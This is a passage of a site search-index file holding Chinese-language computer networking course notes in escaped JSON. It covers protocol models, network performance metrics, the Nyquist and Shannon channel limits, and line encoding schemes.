<p>\u5982\u679c\u9700\u8981\u8fde\u7eed\u4f20\u8f93\u5927\u91cf\u6570\u636e\uff0c\u4e14\u4f20\u9001\u65f6\u95f4\u8fdc\u5927\u4e8e\u8fde\u63a5\u65f6\u95f4\uff0c\u5219\u9009\u62e9\u7535\u8def\u4ea4\u6362\u6700\u5408\u9002</p>"},{"location":"Courses/CN/Topic0/#_2","title":"\u534f\u8bae\u4e0e\u6a21\u578b","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5404\u5c42\u53ca\u5176\u534f\u8bae\u7684\u96c6\u5408\u79f0\u4e3a\u7f51\u7edc\u7684\u4f53\u7cfb\u7ed3\u6784\uff0c\u5176\u4e2d\u6700\u5e95\u5c42\u662f\u6574\u4e2a\u5c42\u6b21\u7ed3\u6784\u7684\u57fa\u7840\uff1b\u6700\u9ad8\u5c42\u5219\u9762\u5411\u7528\u6237\u63d0\u4f9b\u670d\u52a1\u3002</p> <ul> <li>\u534f\u8bae\u6570\u636e\u5355\u5143\uff08PDU\uff09 \u5bf9\u7b49\u5c42\u4e4b\u95f4\u4f20\u9001\u7684\u6570\u636e\u5355\u4f4d\uff0c\u5404\u5c42\u7684 PDU \u90fd\u5206\u4e3a\u670d\u52a1\u6570\u636e\u5355\u5143\u548c\u534f\u8bae\u63a7\u5236\u4fe1\u606f\u4e24\u90e8\u5206<ul> <li>\u7269\u7406\u5c42\u79f0\u6bd4\u7279\u6d41\uff0c\u6570\u636e\u94fe\u8def\u5c42\u79f0\u5e27\uff0c\u7f51\u7edc\u5c42\u79f0\u5206\u7ec4\uff0c\u4f20\u8f93\u5c42\u79f0\u62a5\u6587\u6bb5</li> <li>\u534f\u8bae\u63a7\u5236\u4fe1\u606f\uff08PCI\uff09 \u63a7\u5236\u534f\u8bae\u64cd\u4f5c\u7684\u4fe1\u606f</li> </ul> </li> <li>\u670d\u52a1\u6570\u636e\u5355\u5143\uff08SDU\uff09 \u5c42\u4e0e\u5c42\u4e4b\u95f4\u4ea4\u6362\u7684\u6570\u636e\u5355\u4f4d\uff0cn-SDU \u6307 n+1 \u5c42\u4e0e n \u5c42\u4ea4\u6362\u7684\u5355\u4f4d<ul> <li>n-SDU + n-PCI = n-PDU = (n-1)-SDU</li> </ul> </li> </ul> <p>\u7f51\u7edc\u534f\u8bae\uff08Network Protocol\uff09\u662f\u4e3a\u4e86\u5728\u7f51\u7edc\u4e2d\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u800c\u5efa\u7acb\u7684\u6807\u51c6\uff0c\u4f5c\u7528\u4e8e\u5bf9\u7b49\u5b9e\u4f53\u4e4b\u95f4\uff0c\u662f\u6c34\u5e73\u7684\u3002</p> <p>\u800c\u670d\u52a1\u6307\u7684\u662f\u4e0b\u5c42\u4e3a\u7d27\u90bb\u7684\u4e0a\u5c42\u63d0\u4f9b\u7684\u529f\u80fd\u8c03\u7528\uff0c\u662f\u5782\u76f4\u7684\uff0c\u4e8c\u8005\u6982\u5ff5\u4e0d\u540c\u3002</p> <p></p> <p>\u8ba1\u7b97\u673a\u7f51\u7edc\u63d0\u4f9b\u7684\u670d\u52a1\u53ef\u6309\u7167\u5982\u4e0b\u4e09\u79cd\u65b9\u5f0f\u5206\u7c7b\uff1a</p> <p>\u9762\u5411\u8fde\u63a5\u670d\u52a1\u4e0e\u65e0\u8fde\u63a5\u670d\u52a1</p> <ul> <li>\u9762\u5411\u8fde\u63a5\u670d\u52a1 \u901a\u4fe1\u524d\u53cc\u65b9\u5fc5\u987b\u5148\u5efa\u7acb\u8fde\u63a5\uff0c\u5e76\u5206\u914d\u76f8\u5e94\u8d44\u6e90\uff1b\u4f20\u8f93\u7ed3\u675f\u540e\u8981\u91ca\u653e\u8fde\u63a5\u548c\u5360\u7528\u7684\u8d44\u6e90\u3002<ul> <li>\u4f8b\u5982 TCP \u5c31\u662f\u4e00\u79cd\u9762\u5411\u8fde\u63a5\u670d\u52a1\u7684\u534f\u8bae</li> </ul> </li> <li>\u65e0\u8fde\u63a5\u670d\u52a1 \u901a\u4fe1\u524d\u53cc\u65b9\u4e0d\u9700\u8981\u5148\u5efa\u7acb\u8fde\u63a5\uff0c\u201c\u5c3d\u6700\u5927\u52aa\u529b\u4ea4\u4ed8\u201d\u6570\u636e\uff0c\u662f\u4e00\u79cd\u4e0d\u53ef\u9760\u7684\u670d\u52a1\u3002<ul> <li>\u4f8b\u5982 IP\uff0cUDP \u5c31\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u670d\u52a1\u7684\u534f\u8bae</li> </ul> </li> </ul> <p>\u53ef\u9760\u670d\u52a1\u4e0e\u4e0d\u53ef\u9760\u670d\u52a1</p> <ul> <li>\u53ef\u9760\u670d\u52a1 \u6307\u7f51\u7edc\u5177\u6709\u7ea0\u9519\u3001\u68c0\u9519\u3001\u5e94\u7b54\u7b49\u673a\u5236\uff0c\u80fd\u591f\u4fdd\u8bc1\u6570\u636e\u6b63\u786e\u53ef\u9760\u4f20\u9001\u5230\u76ee\u7684\u5730</li> <li>\u4e0d\u53ef\u9760\u670d\u52a1 \u6307\u7f51\u7edc\u5c3d\u91cf\u8ba9\u6570\u636e\u6b63\u786e\u53ef\u9760\u4f20\u9001\u5230\u76ee\u7684\u5730<ul> <li>\u4e0d\u53ef\u9760\u670d\u52a1\u7f51\u7edc\u7684\u6b63\u786e\u6027\u3001\u53ef\u9760\u6027\u8981\u7531\u5e94\u7528\u548c\u7528\u6237\u6765\u4fdd\u969c</li> </ul> </li> </ul> <p>\u6709\u5e94\u7b54\u670d\u52a1\u548c\u65e0\u5e94\u7b54\u670d\u52a1</p> <ul> <li>\u6709\u5e94\u7b54\u670d\u52a1 \u6307\u63a5\u6536\u65b9\u6536\u5230\u6570\u636e\u540e\u50cf\u53d1\u9001\u65b9\u7ed9\u51fa\u76f8\u5e94\u7684\u5e94\u7b54<ul> <li>\u4f8b\u5982\u6587\u4ef6\u4f20\u8f93\u534f\u8bae FTP \u5c31\u662f\u4e00\u79cd\u6709\u5e94\u7b54\u670d\u52a1</li> </ul> </li> <li>\u65e0\u5e94\u7b54\u670d\u52a1 \u6307\u63a5\u6536\u65b9\u4e0d\u81ea\u52a8\u7ed9\u51fa\u5e94\u7b54\uff0c\u82e5\u9700\u8981\u5e94\u7b54\u5219\u7531\u9ad8\u5c42\u5b9e\u73b0<ul> <li>\u4f8b\u5982 WWW \u670d\u52a1 \u5c31\u662f\u4e00\u79cd\u65e0\u5e94\u7b54\u670d\u52a1</li> </ul> </li> </ul> <p>TCP/IP \u6a21\u578b\u00a0\u548c\u00a0\u5f00\u653e\u5f0f\u7cfb\u7edf\u4e92\u8054(OSI)\u6a21\u578b\u00a0\u662f\u7814\u7a76\u548c\u8ba8\u8bba\u7f51\u7edc\u529f\u80fd\u65f6\u4f7f\u7528\u7684\u4e3b\u8981\u7684\u6a21\u578b\u548c\u901a\u7528\u8bed\u8a00\u3002</p> <p></p> <ul> <li>&lt;1&gt; OSI \u53c2\u8003\u6a21\u578b\u7684\u6700\u5927\u8d21\u732e\u662f\u7cbe\u786e\u5b9a\u4e49\u4e86\u670d\u52a1\u3001\u534f\u8bae\u3001\u63a5\u53e3\u4e09\u4e2a\u4e3b\u8981\u6982\u5ff5\uff1b\u800c TCP/IP \u5728\u8fd9\u4e09\u4e2a\u6982\u5ff5\u4e0a\u6ca1\u6709\u660e\u786e\u533a\u5206</li> <li>&lt;2&gt; OSI \u53c2\u8003\u6a21\u578b\u662f 7 \u5c42\u6a21\u578b\uff0c\u800c TCP/IP \u662f\u56db\u5c42\u6a21\u578b</li> <li>&lt;3&gt; OSI \u53c2\u8003\u6a21\u578b\u5148\u6709\u6a21\u578b\uff0c\u540e\u6709\u534f\u8bae\u89c4\u8303\uff0c\u9002\u5408\u901a\u7528\u63cf\u8ff0\u5404\u79cd\u7f51\u7edc\uff1b\u800c TCP/IP \u6a21\u578b\u73b0\u6709\u534f\u8bae\u6808\uff0c\u540e\u5efa\u7acb\u6a21\u578b\uff0c\u56e0\u6b64\u4e0d\u9002\u5408\u4efb\u4f55\u5176\u5b83\u7684\u975e TCP/IP \u7f51\u7edc</li> <li>&lt;4&gt; OSI \u53c2\u8003\u6a21\u578b\u5728\u7f51\u7edc\u5c42\u652f\u6301\u65e0\u8fde\u63a5\u548c\u9762\u5411\u8fde\u63a5\u901a\u4fe1\uff0c\u4f46\u4f20\u8f93\u5c42\u4ec5\u6709\u9762\u5411\u8fde\u63a5\u901a\u4fe1\uff1bTCP/IP \u6a21\u578b\u5728\u7f51\u9645\u5c42\u4ec5\u6709\u65e0\u8fde\u63a5\u901a\u4fe1\uff0c\u4f46\u4f20\u8f93\u5c42\u652f\u6301\u65e0\u8fde\u63a5\u548c\u9762\u5411\u8fde\u63a5\u901a\u4fe1</li> </ul> Quote <p></p> <p>\u4e24\u4e2a\u6a21\u578b\u90fd\u4e0d\u662f\u5b8c\u7f8e\u7684\uff0c\u672c\u8bfe\u7a0b\u91c7\u53d6\u6298\u4e2d\u7684\u529e\u6cd5\uff0c\u91c7\u7528\u4e86 5 \u5c42\u534f\u8bae\u7684\u4f53\u7cfb\u7ed3\u6784\uff1a</p> <p></p>"},{"location":"Courses/CN/Topic0/#_3","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u5ea6\u91cf\u5355\u4f4d","text":"<p>\u672c\u8282\u7ed9\u51fa\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u76f8\u5173\u5ea6\u91cf\u5355\u4f4d\u7684\u6982\u5ff5\u3002</p> <p>\u6bd4\u7279\u7387 bit rate</p> <ul> <li>\u6982\u5ff5: \u4e3b\u673a\u5728\u6570\u5b57\u4fe1\u9053\u4e0a\u4f20\u9001\u6570\u636e\u7684\u901f\u7387\uff0c\u4e5f\u79f0\u6570\u636e\u7387</li> <li>\u5355\u4f4d: b/s\uff08or bps\uff09</li> </ul> <p>\u5e26\u5bbd bandwidth</p> <ul> <li>\u6982\u5ff5: \u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u6307\u7f51\u7edc\u901a\u4fe1\u7ebf\u8def\u80fd\u4f20\u9001\u6570\u636e\u7684\u80fd\u529b\uff0c\u5373\u6700\u9ad8\u6570\u636e\u4f20\u8f93\u901f\u7387</li> <li>\u5355\u4f4d: b/s\uff08or bps\uff09</li> </ul> <p>\u541e\u5410\u91cf throughput</p> <ul> <li>\u6982\u5ff5: \u5355\u4f4d\u65f6\u95f4\u5185\u901a\u8fc7\u67d0\u4e2a\u7f51\u7edc\uff08or \u4fe1\u9053\u3001\u63a5\u53e3\uff09\u7684\u6570\u636e\u91cf</li> <li>\u5355\u4f4d: b/s\uff08or bps\uff09</li> </ul> <p>\u65f6\u5ef6 delay</p> <ul> <li>\u6982\u5ff5: \u6570\u636e\u4ece\u7f51\u7edc\u7684\u4e00\u7aef\u4f20\u9001\u5230\u53e6\u4e00\u7aef\u6240\u9700\u7684\u65f6\u95f4<ul> <li>\u4f20\u8f93\u65f6\u5ef6 transmission delay: \u53c8\u88ab\u79f0\u4e3a\u53d1\u9001\u65f6\u5ef6\uff0c\u6570\u636e\u4ece\u8282\u70b9\u8fdb\u5165\u4f20\u8f93\u4ecb\u8d28\u6240\u9700\u8981\u7684\u65f6\u95f4\uff0c\u901a\u5e38\u7b49\u4e8e\u6570\u636e\u91cf\u5927\u5c0f\u9664\u4ee5\u6bd4\u7279\u7387</li> <li>\u4f20\u64ad\u65f6\u5ef6 propagation delay: \u7535\u78c1\u6ce2\u5728\u4fe1\u9053\u4e2d\u9700\u8981\u4f20\u64ad\u4e00\u5b9a\u8ddd\u79bb\u800c\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u901a\u5e38\u7b49\u4e8e\u4fe1\u9053\u957f\u5ea6\u9664\u4ee5\u7535\u78c1\u6ce2\u5728\u4fe1\u9053\u5185\u7684\u4f20\u8f93\u901f\u5ea6\uff08\u4f8b\u5982\u5149\u901f c\uff09</li> <li>\u5904\u7406\u65f6\u5ef6 processing delay: \u4e3b\u673a\u6216\u8def\u7531\u5668\u6536\u5230\u5206\u7ec4\u540e\uff0c\u4e3a\u5904\u7406\u5206\u7ec4\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u4f8b\u5982\u5206\u6790\u9996\u90e8\u3001\u63d0\u53d6\u6570\u636e\u3001\u5dee\u9519\u68c0\u9a8c\u6216\u67e5\u627e\u8def\u7531</li> <li>\u6392\u961f\u65f6\u5ef6 queueing delay: \u5206\u7ec4\u5728\u8def\u7531\u5668\u8f93\u5165\u8f93\u51fa\u961f\u5217\u4e2d\u6392\u961f\u7b49\u5f85\u5904\u7406\u6240\u7ecf\u5386\u7684\u65f6\u5ef6</li> </ul> </li> <li>\u5355\u4f4d: s</li> </ul> <p>\u5f80\u8fd4\u65f6\u5ef6 Round-Trip Time</p> <ul> <li>\u6982\u5ff5: \u4ece\u53d1\u9001\u65b9\u53d1\u9001\u6570\u636e\u5f00\u59cb\uff0c\u5230\u53d1\u9001\u65b9\u6536\u5230\u63a5\u6536\u65b9\u7684\u786e\u8ba4\u7ecf\u8fc7\u7684\u603b\u65f6\u95f4<ul> <li>\u53ef\u7528\u4e8e\u5224\u65ad\u7f51\u7edc\u7684\u8fde\u901a\u6027\uff0c\u6700\u5178\u578b\u7684\u4e3a <code>ping</code> \u547d\u4ee4</li> </ul> </li> <li>\u5355\u4f4d: s</li> </ul> <p>\u65f6\u5ef6\u5e26\u5bbd\u79ef bandwidth-delay product</p> <ul> <li>\u6982\u5ff5: \u6307\u53d1\u9001\u7aef\u53d1\u9001\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\u5373\u5c06\u5230\u8fbe\u7ec8\u70b9\u65f6\uff0c\u53d1\u9001\u7aef\u5df2\u53d1\u51fa\u591a\u5c11\u6bd4\u7279<ul> <li>\u76f4\u89c2\u6765\u770b\uff0c\u5373\u540c\u4e00\u65f6\u523b\u94fe\u8def\u4e2d\u7684\u6bd4\u7279\u603b\u6570</li> <li>\u65f6\u5ef6\u5e26\u5bbd\u79ef \\(=\\) \u4f20\u64ad\u65f6\u5ef6 \\(\\times\\) \u4fe1\u9053\u5e26\u5bbd</li> </ul> </li> <li>\u5355\u4f4d: bit</li> </ul> <p>\u4fe1\u9053\u5229\u7528\u7387</p> <ul> <li>\u6982\u5ff5: \u67d0\u4e2a\u4fe1\u9053\u767e\u5206\u4e4b\u591a\u5c11\u7684\u65f6\u95f4\u662f\u6709\u6570\u636e\u901a\u8fc7\u7684<ul> <li>\u4fe1\u9053\u5229\u7528\u7387 \\(=\\) \u6709\u6570\u636e\u901a\u8fc7\u7684\u65f6\u95f4 \\(/\\) (\u6709\u6570\u636e\u901a\u8fc7\u7684\u65f6\u95f4 + \u65e0\u6570\u636e\u901a\u8fc7\u7684\u65f6\u95f4)</li> <li>\u4fe1\u9053\u5229\u7528\u7387\u592a\u4f4e\u5219\u6d6a\u8d39\u7f51\u7edc\u8d44\u6e90\uff1b\u4fe1\u9053\u5229\u7528\u7387\u592a\u9ad8\u5219\u4ea7\u751f\u8f83\u5927\u65f6\u5ef6\uff0c\u5bfc\u81f4\u7f51\u7edc\u62e5\u5835</li> </ul> </li> <li>\u5355\u4f4d: \u65e0</li> </ul>"},{"location":"Courses/CN/Topic1/","title":"\u7269\u7406\u5c42","text":""},{"location":"Courses/CN/Topic1/#_1","title":"\u7269\u7406\u5c42","text":"<p> \u7ea6 3752 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p>"},{"location":"Courses/CN/Topic1/#concept","title":"Concept","text":"<p>\u672c\u8282\u8bb2\u89e3\u7269\u7406\u5c42\u76f8\u5173\u7684\u57fa\u672c\u6982\u5ff5\u3002</p> <p>\u7269\u7406\u5c42\u662f\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684\u6700\u5e95\u5c42\uff0c\u5176\u76ee\u7684\u662f\u5c3d\u53ef\u80fd\u5c4f\u853d\u6389\u4e0d\u540c\u4f20\u8f93\u5a92\u4f53\u548c\u901a\u4fe1\u624b\u6bb5\u7684\u5dee\u5f02\uff0c\u5728\u8fde\u63a5\u5404\u8ba1\u7b97\u673a\u7684\u4f20\u8f93\u5a92\u4f53\u4e0a\u4f20\u8f93\u6570\u636e\u6bd4\u7279\u6d41\uff0c\u4e3a\u6570\u636e\u94fe\u8def\u5c42\u63d0\u4f9b\u4e00\u4e2a\u540c\u4e00\u7684\u6570\u636e\u4f20\u8f93\u670d\u52a1\u3002</p> <p>\u4e3a\u6b64\uff0c\u7269\u7406\u5c42\u786e\u5b9a\u4e86\u4e0e\u4f20\u8f93\u4ecb\u8d28\u7684\u63a5\u53e3\u76f8\u5173\u7684\u56db\u4e2a\u7279\u6027\uff1a\u673a\u68b0\u7279\u6027\u3001\u7535\u6c14\u7279\u6027\u3001\u529f\u80fd\u7279\u6027\u3001\u8fc7\u7a0b\u7279\u6027\u3002</p> <p>\u6570\u636e\u662f\u4f20\u9001\u4fe1\u606f\u7684\u5b9e\u4f53\uff0c\u4fe1\u53f7\u5219\u662f\u6570\u636e\u7684\u7535\u6c14\u6216\u7535\u78c1\u8868\u73b0\uff0c\u662f\u6570\u636e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u7684\u5b58\u5728\u5f62\u5f0f\u3002</p> <p>\u5728\u901a\u4fe1\u7cfb\u7edf\u4e2d\uff0c\u5e38\u7528\u4e00\u4e2a\u56fa\u5b9a\u65f6\u957f\u7684\u4fe1\u53f7\u6ce2\u5f62\u8868\u793a\u4e00\u4e2a k \u8fdb\u5236\u6570\uff0c\u8fd9\u4e2a\u65f6\u957f\u5185\u7684\u4fe1\u53f7\u79f0\u4e3ak \u8fdb\u5236\u7801\u5143\uff0c\u65f6\u957f\u79f0\u4e3a\u7801\u5143\u5bbd\u5ea6\uff08or \u4fe1\u53f7\u5468\u671f\uff09\u3002</p> <p>\u4e00\u4e2a\u7801\u5143\u53ef\u4ee5\u643a\u5e26\u82e5\u5e72\u6bd4\u7279\u4fe1\u606f\uff0c\u4f8b\u5982\u4e00\u4e2a\u4fe1\u53f7\u5468\u671f\u5185\u53ef\u80fd\u51fa\u73b0\u56db\u79cd\u4fe1\u53f7\uff0c\u5219\u6bcf\u4e2a\u4fe1\u53f7\u5bf9\u5e94\u4e00\u4e2a 4 \u8fdb\u5236\u6570\uff082 bit\uff09\u3002</p> <p>\u6570\u636e\u4e0e\u4fe1\u53f7\u90fd\u6709\u6a21\u62df\u548c\u6570\u5b57\u4e00\u5206\uff0c\u5bf9\u5e94\u4e86\u8fde\u7eed\u548c\u79bb\u6563\u4e24\u79cd\u8868\u793a\u65b9\u5f0f\u3002</p> <ul> <li>\u4ee5\u6a21\u62df\u4fe1\u53f7\u6765\u4f20\u9001\u4fe1\u606f\u7684\u901a\u4fe1\u65b9\u5f0f\u79f0\u4e3a\u6a21\u62df\u901a\u4fe1\uff0c\u4f20\u8f93\u6a21\u62df\u4fe1\u53f7\u7684\u901a\u4fe1\u7cfb\u7edf\u79f0\u4e3a\u6a21\u62df\u901a\u4fe1\u7cfb\u7edf</li> <li>\u4ee5\u6570\u5b57\u4fe1\u53f7\u6765\u4f20\u9001\u4fe1\u606f\u7684\u901a\u4fe1\u65b9\u5f0f\u79f0\u4e3a\u6570\u5b57\u901a\u4fe1\uff0c\u4f20\u8f93\u6570\u5b57\u4fe1\u53f7\u7684\u901a\u4fe1\u7cfb\u7edf\u79f0\u4e3a\u6570\u5b57\u901a\u4fe1\u7cfb\u7edf</li> </ul> <p>\u6a21\u62df\u4fe1\u53f7\u548c\u6570\u5b57\u4fe1\u53f7\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u76f8\u4e92\u53d8\u6362\uff0c\u5373 A/D \u548c D/A\u3002</p> <p>\u4ece\u901a\u4fe1\u53cc\u65b9\u4fe1\u606f\u7684\u4ea4\u4e92\u65b9\u5f0f\u770b\uff0c\u5206\u4e3a\u4e09\u79cd\u57fa\u672c\u65b9\u5f0f\uff1a</p> <ul> <li>\u5355\u5de5\u901a\u4fe1 Simplex: \u53ea\u6709\u4e00\u4e2a\u65b9\u5411\u7684\u901a\u4fe1\u4e14\u6ca1\u6709\u53cd\u65b9\u5411\u7684\u4ea4\u4e92\uff0c\u4f8b\u5982\u5e7f\u64ad</li> <li>\u534a\u53cc\u5de5\u901a\u4fe1 Half-Duplex: \u901a\u4fe1\u53cc\u65b9\u90fd\u53ef\u4ee5\u53d1\u9001\u6216\u63a5\u6536\u4fe1\u606f\uff0c\u4f46\u4efb\u4f55\u4e00\u65b9\u90fd\u4e0d\u80fd\u540c\u65f6\u53d1\u9001\u548c\u63a5\u6536\u4fe1\u606f</li> <li>\u5168\u53cc\u5de5\u901a\u4fe1 Full-Duplex: \u901a\u4fe1\u53cc\u65b9\u90fd\u53ef\u4ee5\u540c\u65f6\u53d1\u9001\u548c\u63a5\u6536\u4fe1\u606f </li> </ul> <p>\u5355\u5de5\u53ea\u9700\u8981\u4e00\u4e2a\u4fe1\u9053\uff0c\u800c\u534a\u53cc\u5de5\u548c\u5168\u53cc\u5de5\u90fd\u9700\u8981\u4e24\u4e2a\u4fe1\u9053</p>"},{"location":"Courses/CN/Topic1/#_2","title":"\u4fe1\u9053\u6781\u9650\u5bb9\u91cf","text":"<p>\u4efb\u4f55\u5b9e\u9645\u7684\u4fe1\u9053\u90fd\u4e0d\u662f\u7406\u60f3\u7684\uff0c\u4fe1\u53f7\u5728\u4fe1\u9053\u4e0a\u4f20\u8f93\u4e0d\u53ef\u907f\u514d\u5730\u4f1a\u4ea7\u751f\u5931\u771f\u3002\u53ea\u8981\u63a5\u6536\u7aef\u80fd\u591f\u4ece\u5931\u771f\u7684\u4fe1\u53f7\u6ce2\u5f62\u4e2d\u8bc6\u522b\u51fa\u539f\u6765\u7684\u4fe1\u53f7\uff0c\u8fd9\u79cd\u5931\u771f\u5c31\u5bf9\u901a\u4fe1\u8d28\u91cf\u6ca1\u6709\u5f71\u54cd\u3002</p> <p>\u5948\u6c0f\u51c6\u5219</p> <p>\u4fe1\u53f7\u4e2d\u7684\u9ad8\u9891\u5206\u91cf\u5f80\u5f80\u4f1a\u5728\u4f20\u8f93\u4e2d\u8870\u51cf\uff0c\u5bfc\u81f4\u63a5\u6536\u7aef\u4e0d\u80fd\u5206\u6e05\u7801\u5143\u4e4b\u95f4\u7684\u754c\u9650\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u7801\u95f4\u4e32\u6270\u3002</p> <p>\u5948\u594e\u65af\u7279\u5b9a\u7406\u89c4\u5b9a\uff0c\u5728\u7406\u60f3\uff08\u6ca1\u6709\u566a\u58f0\uff0c\u5e26\u5bbd\u6709\u9650\uff09\u4fe1\u9053\u4e2d\uff0c\u4e3a\u4e86\u907f\u514d\u7801\u95f4\u4e32\u6270\uff0c\u6781\u9650\u7801\u5143\u4f20\u8f93\u901f\u7387\u5e94\u4e3a \\(2W\\) \u6ce2\u7279\uff0c\u5176\u4e2d \\(W\\) \u4e3a\u4fe1\u9053\u7684\u9891\u7387\u5e26\u5bbd\uff0c\u5355\u4f4d\u4e3a Hz\u3002</p> <p>\u82e5\u7528 \\(V\\) \u8868\u793a\u7801\u5143\u7684\u79bb\u6563\u7535\u5e73\u6570\u91cf\uff0c\u5219\u8be5\u7801\u5143\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u4e3a\u4e2a\u6570\u4e3a \\(\\log_2 V\\)\uff0c\u90a3\u4e48\u5948\u6c0f\u51c6\u5219\u4e0b\u7684\u6781\u9650\u6570\u636e\u4f20\u8f93\u901f\u7387\u4e3a\uff1a</p> \\[ 2W \\log_2 V \\;\\;\\; (b/s) \\] <p>\u5948\u6c0f\u51c6\u5219\u7ed9\u51fa\u4e86\u7801\u5143\u4f20\u8f93\u901f\u7387\u7684\u4e0a\u9650\uff0c\u4f46\u672a\u5bf9\u4e00\u4e2a\u7801\u5143\u6700\u591a\u53ef\u4ee5\u8868\u793a\u591a\u5c11\u6bd4\u7279\u7ed9\u51fa\u9650\u5236\uff0c\u56e0\u6b64\u8981\u63d0\u9ad8\u6570\u636e\u4f20\u8f93\u901f\u7387\u53ef\u4ee5\u8bbe\u6cd5\u4f7f\u6bcf\u4e2a\u7801\u5143\u643a\u5e26\u66f4\u591a\u6bd4\u7279\u7684\u4fe1\u606f\u91cf</p> <p>\u9999\u519c\u5b9a\u7406</p> <p>\u5b9e\u9645\u7684\u4fe1\u9053\u5b58\u5728\u968f\u673a\u566a\u58f0\uff0c\u9999\u519c\u5b9a\u7406\u7ed9\u51fa\u4e86\u5e26\u5bbd\u53d7\u9650\u4e14\u5b58\u5728\u9ad8\u65af\u566a\u58f0\u5e72\u6270\u7684\u4fe1\u9053\u7684\u6781\u9650\u6570\u636e\u4f20\u8f93\u901f\u7387\uff1a</p> \\[ W\\log_2 (1+ S / N)\\;\\;\\; (b/s) \\] <p>\u5176\u4e2d \\(S\\) \u4e3a\u4fe1\u9053\u5185\u4fe1\u53f7\u7684\u5e73\u5747\u529f\u7387\uff0c\\(N\\) \u4e3a\u4fe1\u9053\u5185\u9ad8\u65af\u566a\u58f0\u7684\u529f\u7387\u3002\u6211\u4eec\u79f0 \\(S / N\\) \u4e3a\u4fe1\u566a\u6bd4\uff0c\u5b83\u6709\u65e0\u5355\u4f4d\u8bb0\u6cd5\u548c\u5206\u8d1d\u8bb0\u6cd5\u4e24\u79cd\u5f62\u5f0f\uff1a</p> <ul> <li>\u5f53\u91c7\u7528\u65e0\u5355\u4f4d\u8bb0\u6cd5\u65f6\uff0c\u4fe1\u566a\u6bd4 \\(= S/ N\\)</li> <li>\u5f53\u91c7\u7528\u5206\u8d1d\u8bb0\u6cd5\u65f6\uff0c\u4fe1\u566a\u6bd4 \\(=10\\log_{10} (S / N)\\)</li> </ul> <p>\u4f8b\u5982\u5f53 \\(S/ N=1000\\) \u65f6\uff0c\u4fe1\u566a\u6bd4\u7b49\u4e8e 30 dB</p> <p>\u6839\u636e\u9999\u519c\u5b9a\u7406\uff0c\u6211\u4eec\u76f4\u5230\u53ea\u8981\u4fe1\u606f\u4f20\u8f93\u901f\u7387\u4f4e\u4e8e\u4fe1\u9053\u7684\u6781\u9650\u4f20\u8f93\u901f\u7387\uff0c\u5c31\u80fd\u627e\u5230\u67d0\u79cd\u65b9\u6cd5\u5b9e\u73b0\u65e0\u5dee\u9519\u7684\u63a7\u5236\u3002\u4e0d\u8fc7\u5b9e\u9645\u4fe1\u9053\u80fd\u8fbe\u5230\u7684\u4f20\u8f93\u901f\u7387\u8981\u6bd4\u8be5\u6781\u9650\u4fe1\u606f\u4f20\u8f93\u901f\u7387\u4f4e\u4e0d\u5c11\u3002</p>"},{"location":"Courses/CN/Topic1/#_3","title":"\u7f16\u7801\u4e0e\u8c03\u5236","text":"<p>\u5c06\u6570\u636e\u8f6c\u6362\u4e3a\u6570\u5b57\u4fe1\u53f7\u7684\u8fc7\u7a0b\u79f0\u4e3a\u7f16\u7801\uff0c\u5c06\u6570\u636e\u8f6c\u6362\u4e3a\u6a21\u62df\u4fe1\u53f7\u7684\u8fc7\u7a0b\u79f0\u4e3a\u8c03\u5236\u3002</p>"},{"location":"Courses/CN/Topic1/#_4","title":"\u7f16\u7801","text":"<p>\u7f16\u7801\u51b3\u5b9a\u4e86\u5177\u4f53\u7528\u4ec0\u4e48\u6837\u7684\u6570\u5b57\u4fe1\u53f7\u8868\u793a 0 \u548c 1\uff0c\u5e38\u7528\u7684\u6570\u5b57\u6570\u636e\u7f16\u7801\u6709\u5982\u4e0b\u51e0\u79cd\uff1a</p> <p></p> <ul> <li>\u5f52\u96f6\u7f16\u7801 RZ: \u7528\u9ad8\u7535\u5e73\u8868\u793a 1\uff0c\u4f4e\u7535\u5e73\u8868\u793a 0\uff1b\u6bcf\u4e2a\u7801\u5143\u4e2d\u95f4\u5747\u8df3\u53d8\u56de\u96f6\u7535\u5e73\uff0c\u63a5\u6536\u65b9\u636e\u6b64\u8c03\u6574\u65f6\u949f\uff0c\u4ee5\u8fbe\u5230\u81ea\u540c\u6b65\u673a\u5236<ul> <li>\u56e0\u4e3a\u5f52\u96f6\u5360\u7528\u5e26\u5bbd\uff0c\u4f20\u8f93\u6548\u7387\u6536\u5230\u5f71\u54cd</li> </ul> </li> <li>\u975e\u5f52\u96f6\u7f16\u7801 NRZ: \u4e0e RZ \u533a\u522b\u5728\u4e8e\u4e0d\u7528\u5f52\u96f6\uff0c\u4e00\u4e2a\u65f6\u949f\u5168\u90e8\u7528\u6765\u4f20\u8f93\u6570\u636e\uff0c\u6548\u7387\u6700\u9ad8\uff0c\u4f46\u5b58\u5728\u540c\u6b65\u95ee\u9898<ul> <li>\u540c\u6b65\u95ee\u9898\u53ef\u901a\u8fc7\u53cc\u65b9\u90fd\u5e26\u6709\u65f6\u949f\u7ebf\u89e3\u51b3</li> </ul> </li> <li>\u53cd\u5411\u975e\u5f52\u96f6\u7f16\u7801 NRZI: \u4e5f\u53eb\u9022 0 \u53d8\u5316 NRZ\uff0c\u7528\u7535\u5e73\u7684\u8df3\u53d8\u8868\u793a 0\uff0c\u7535\u5e73\u4fdd\u6301\u4e0d\u53d8\u8868\u793a 1<ul> <li>\u8fd9\u79cd\u7f16\u7801\u96c6\u6210\u4e86\u524d\u4e24\u79cd\u7f16\u7801\u7684\u4f18\u70b9\uff0c\u65e2\u80fd\u4f20\u8f93\u65f6\u949f\u4fe1\u53f7\uff0c\u53c8\u5c3d\u91cf\u4e0d\u635f\u5931\u7cfb\u7edf\u5e26\u5bbd</li> <li>USB 2.0 